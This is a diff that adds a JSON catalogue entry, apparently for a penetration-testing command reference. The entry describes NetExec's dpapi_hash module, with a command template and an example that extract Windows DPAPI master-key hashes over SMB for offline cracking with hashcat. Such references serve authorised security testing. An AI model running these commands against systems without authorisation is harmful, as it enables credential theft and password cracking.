@@ -1,0 +1,16 @@
+{
+  "id": "nxc-dpapi-hash",
+  "name": "NetExec dpapi_hash Module",
+  "command": "nxc smb <target> -u '<user>' -p '<password>' -M dpapi_hash",
+  "description": "Extract DPAPI master-key hashes for offline cracking with hashcat (mode 15300 for v1 / 15900 for v2). Lighter than full DPAPI decryption — drops just the encrypted key blobs and metadata so you can crack the user's password offline if you only have a low-priv shell. Requires local admin or the target user's hive access.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb"],
+  "tags": ["netexec", "nxc", "dpapi", "hashcat", "offline-cracking"],
+  "references": [
+    { "title": "DPAPI hash modes (hashcat)", "url": "https://hashcat.net/wiki/doku.php?id=example_hashes" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M dpapi_hash"
+  ]
+}
